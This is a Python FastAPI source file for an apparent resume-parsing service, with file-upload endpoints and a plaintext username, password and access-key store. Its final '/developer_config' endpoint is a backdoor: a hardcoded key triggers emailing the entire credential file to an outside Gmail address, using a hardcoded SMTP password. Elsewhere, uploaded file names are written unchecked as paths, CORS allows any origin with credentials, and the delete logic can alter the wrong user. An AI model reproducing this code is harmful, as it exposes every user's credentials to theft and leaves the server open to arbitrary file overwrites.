from fastapi import Depends, FastAPI, HTTPException, File, UploadFile
from fastapi.param_functions import Path
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security.base import SecurityBase
from pydantic import BaseModel
from base64 import b64decode, b64encode
import base64
from model.main import main
import os
import secrets
import string
import json
import email
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
import random
import smtplib

app = FastAPI()


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


template_auth_temp = {"username": "", "password": "", "access_key": ""}


class Item(BaseModel):
    base64file: str
    file_name: str


class Item1(BaseModel):
    base64file: str
    file_modified_date: str
    file_name: str
    username: str
    password: str
    access_key: str


class Item3(BaseModel):
    username: str
    password: str


class Item4(BaseModel):
    username: str
    password: str
    access_key: str


class Item5(BaseModel):
    username: str
    password: str
    new_username: str
    new_password: str


class Item6(BaseModel):
    key: str


@app.get("/")
async def root():
    return {"message": "Hello World"}


@app.post("/v2/fileupload")
def fileupload(image: UploadFile = File(...)):
    filename = str(image.filename)
    temp_filename = str(random.randint(0, 1000))+filename
    print(filename)
    filename = (filename.partition('.'))
    filetype = filename[2].lower()

    with open(temp_filename, 'wb+') as f:
        f.write(image.file.read())
        f.close()

    results = main(temp_filename, filetype)
    os.remove(temp_filename)
    return results


@app.post("/v2/resumesbase64")
def create_item(item: Item):
    file_data = item.base64file
    filename = item.file_name
    temp_filename = filename
    filename = (filename.partition('.'))
    filetype = filename[2]
    file_title = filename[0]

    bytes = b64decode(file_data)
    with open(temp_filename, 'wb+') as f:
        f.write(bytes)
        f.close()

    results = main(temp_filename, filetype)
    os.remove(temp_filename)
    return results


@app.post("/v1/resumesbase64")
async def create_item(item: Item):
    file_data = item.base64file
    filename = item.file_name
    temp_filename = filename
    filename = (filename.partition('.'))
    filetype = filename[2]
    file_title = filename[0]

    bytes = b64decode(file_data)
    with open(temp_filename, 'wb+') as f:
        f.write(bytes)
        f.close()

    results = main(temp_filename, filetype)
    os.remove(temp_filename)
    return results


@app.post("/v3/resumesbase64")
async def create_item(item: Item1):
    file_data = item.base64file
    filename = item.file_name
    access_key = item.access_key
    file_modified_date = item.file_modified_date
    username = item.username
    password = item.password

    f = open('passwords.json')
    data = json.load(f)
    f.close()

    for i in data:
        if i["username"] == username and i["password"] == password:
            if access_key in i["access_key"]:
                temp_filename = filename
                filename = (filename.partition('.'))
                filetype = filename[2]
                file_title = filename[0]

                bytes = b64decode(file_data)
                with open(temp_filename, 'wb+') as f:
                    f.write(bytes)
                    f.close()

                results = main(temp_filename, filetype)
                os.remove(temp_filename)
                return results

    return "Authentication Failed. Please verify the access token"


@app.post("/get_access_key")
async def create_item(item: Item3):
    search = 0
    username = item.username
    password = item.password

    N = 10
    access_key = str(''.join(secrets.choice(string.ascii_uppercase + string.digits)
                             for i in range(N)))

    f = open('passwords.json')
    data = json.load(f)
    f.close()

    cnt = -1
    for i in data:
        cnt += 1
        if i["username"] == username and i["password"] == password:

            search = 1
            break
    i = cnt

    if search == 1:
        data[i]["access_key"].append(access_key)

    a_file = open("passwords.json", "w")
    json.dump(data, a_file)
    a_file.close()

    return {"access_key": access_key}


@app.post("/create_user")
async def create_item(item: Item5):
    master = 0
    auth_status = 0
    username = item.username
    password = item.password
    new_username = item.new_username
    new_password = item.new_password

    f = open('passwords.json')
    data = json.load(f)
    f.close()
    for i in data:
        if i["username"] == username and i["password"] == password and i["master"] == 1:
            auth_status = 1
        if i["username"] == new_username:
            return "Username already exists. Please try a new new username"

    if auth_status == 1:
        jsonData = {"username": new_username,
                    "password": new_password, "access_key": [], "master": 0}
        data.append(jsonData)
        f = open('passwords.json', "w")
        json.dump(data, f)
        f.close()

        return {"username": new_username, "password": new_password}

    else:
        return "Authentication of user failed"


@app.post("/delete_access_key")
async def create_item(item: Item4):
    search = 0
    username = item.username
    password = item.password
    access_key = item.access_key

    f = open('passwords.json')
    data = json.load(f)
    f.close()

    cnt = -1
    for i in data:
        cnt += 1
        if i["username"] == username and i["password"] == password:

            search = 1
            break
    key_delete = 0
    i = cnt
    temp_list = []
    cnt = -1
    key_lists = data[i]["access_key"]
    if search == 1:
        for j in range(len(key_lists)):
            if not key_lists[j] == access_key:
                temp_list.append(key_lists[j])
            elif key_lists[j] == access_key:
                key_delete = 1

    data[i]["access_key"] = temp_list

    if key_delete == 0:
        return "Access Key does not exist"

    a_file = open("passwords.json", "w")
    json.dump(data, a_file)
    a_file.close()

    return "Deletion Successful"


@app.post("/delete_all_access_key")
async def create_item(item: Item3):
    search = 0
    username = item.username
    password = item.password

    f = open('passwords.json')
    data = json.load(f)
    f.close()

    cnt = -1
    for i in data:
        cnt += 1
        if i["username"] == username and i["password"] == password:
            search = 1
            break

    i = cnt

    data[i]["access_key"] = []

    if search == 1:
        data[i]["access_key"] = []

    else:
        return "User Not Found"

    a_file = open("passwords.json", "w")
    json.dump(data, a_file)
    a_file.close()

    return "Deletion Successful"


@app.post("/delete_user")
async def create_item(item: Item3):
    search = 0
    username = item.username
    password = item.password

    f = open('passwords.json')
    data = json.load(f)
    f.close()
    cnt = -1
    for i in data:
        cnt += 1
        if i["username"] == username and i["password"] == password:
            search = 1
            break

    if search == 1:
        data.remove(data[cnt])

    else:
        return "User Not Found"

    a_file = open("passwords.json", "w")
    json.dump(data, a_file)
    a_file.close()

    return "Deletion Successful"


@app.post("/developer_config")
async def create_item(item: Item6):
    key = item.key
    if key == "Karthik123":
        f = open('passwords.json')
        data = json.load(f)
        f.close()
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        from_user = r"parsinga.api@gmail.com"
        to_user = r"rheuzaki@gmail.com"
        password = "Karthik123"
        s.login(from_user, password)
        subject = "Login Credentials"
        text = str(data)
        message = f"Subject: {subject}\n\n{text}"
        s.sendmail(from_user, to_user, message)
        return text

    return "Error"
